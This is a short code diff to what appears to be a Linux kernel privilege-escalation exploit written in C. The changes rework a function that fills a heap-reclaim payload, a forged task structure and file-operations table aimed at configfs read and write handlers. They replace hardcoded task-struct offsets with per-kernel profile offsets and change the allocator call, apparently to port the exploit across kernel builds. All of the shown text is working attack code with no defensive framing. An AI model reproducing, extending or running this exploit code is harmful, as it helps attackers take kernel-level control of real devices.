@@ -239,9 +239,9 @@ static void fill_reclaim_payload(uint8_t *p, uint32_t page_base) {
     *(uint32_t *)(p + 0x400 + g_profile.task_prio_off) = 120;
     *(uint32_t *)(p + 0x400 + g_profile.task_static_prio_off) = 120;
     *(uint32_t *)(p + 0x400 + g_profile.task_normal_prio_off) = 120;
-    *(uint32_t *)(p + 0x400 + 0x594) = 0;
-    *(uint32_t *)(p + 0x400 + 0x598) = 0;
-    *(uint32_t *)(p + 0x400 + 0x59c) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_waiters_off) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_waiters_leftmost_off) = 0;
+    *(uint32_t *)(p + 0x400 + g_profile.task_pi_blocked_on_off) = 0;
 
     *(uint32_t *)(p + 0x200 + g_profile.fops_read_off) = g_profile.configfs_read_file;
     *(uint32_t *)(p + 0x200 + g_profile.fops_read_off + 4) = g_profile.configfs_write_file;
@@ -252,7 +252,7 @@ static void fill_reclaim_payload(uint8_t *p, uint32_t page_base) {
 }
 
 static int setup_socket_reclaim(uint32_t page_base) {
-    g_reclaim_payload = aligned_alloc(MM_SLAB_SIZE, MM_SLAB_SIZE);
+    g_reclaim_payload = memalign(MM_SLAB_SIZE, MM_SLAB_SIZE);
     g_reclaim_svs = calloc(RECLAIM_PAGES, sizeof(*g_reclaim_svs));
     if (!g_reclaim_payload || !g_reclaim_svs)
         return 0;
